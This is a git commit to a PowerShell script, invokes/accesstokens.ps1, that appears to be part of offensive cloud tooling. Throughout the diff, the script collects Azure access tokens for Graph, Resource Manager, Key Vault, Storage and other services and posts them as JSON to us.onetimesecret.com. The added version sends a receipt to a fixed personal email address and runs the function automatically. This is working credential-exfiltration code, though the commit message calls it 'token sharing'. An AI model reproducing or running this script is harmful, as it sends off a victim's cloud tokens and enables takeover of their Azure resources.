7a9b83f572184e23dd9d4285b39c114d4dedeabd
Rogier Dijkman <rogierdijkman@hotmail.com>
2025-01-08 11:41:44 +0100

    feat: Enhance AccessToken function to include receiptEmail parameter for improved token sharing

--- invokes/accesstokens.ps1
+++ invokes/accesstokens.ps1
@@ -1,36 +1,44 @@
-$ResourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")
-$OutputFile = "accesstokens.json"
-
-try {
-    $tokens = @()
-
-    foreach ($resourceTypeName in $ResourceTypeNames) {
-        try {
-            $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)
-
-            $tokenObject = [PSCustomObject]@{
-                Resource = $resourceTypeName
-                Token    = $accessToken
-            }
-            $tokens += $tokenObject
-        }
-        catch {
-            Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
-        }
-    }
-
-    $requestParam = @{
-        Uri         = 'https://us.onetimesecret.com/api/v1/share'
-        Method      = 'POST'
-        Body        = @{
-            secret = $tokens | ConvertTo-Json -Depth 10
-            ttl    = 3600
-        }
-    }
+function AccessToken {
+    param (
+        $receiptEmail = "rogierdijkman@hotmail.com"
+    )
     
-    $response = Invoke-RestMethod @requestParam
-    return "https://us.onetimesecret.com/secret/$($response.secret_key)"
+    $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")
+
+    try {
+        $tokens = @()
+
+        foreach ($resourceTypeName in $resourceTypeNames) {
+            try {
+                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName)
+
+                $tokenObject = [PSCustomObject]@{
+                    Resource = $resourceTypeName
+                    Token    = $accessToken
+                }
+                $tokens += $tokenObject
+            }
+            catch {
+                Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
+            }
+        }
+
+        $requestParam = @{
+            Uri    = 'https://us.onetimesecret.com/api/v1/share'
+            Method = 'POST'
+            Body   = @{
+                secret  = $tokens | ConvertTo-Json -Depth 10
+                ttl     = 3600
+                receipt = $($receiptEmail)
+            }
+        }
+    
+        $response = Invoke-RestMethod @requestParam
+        return "https://us.onetimesecret.com/secret/$($response.secret_key)"
+    }
+    catch {
+        Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
+    }
 }
-catch {
-    Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
-}
+
+AccessToken -receiptEmail $receiptEmail
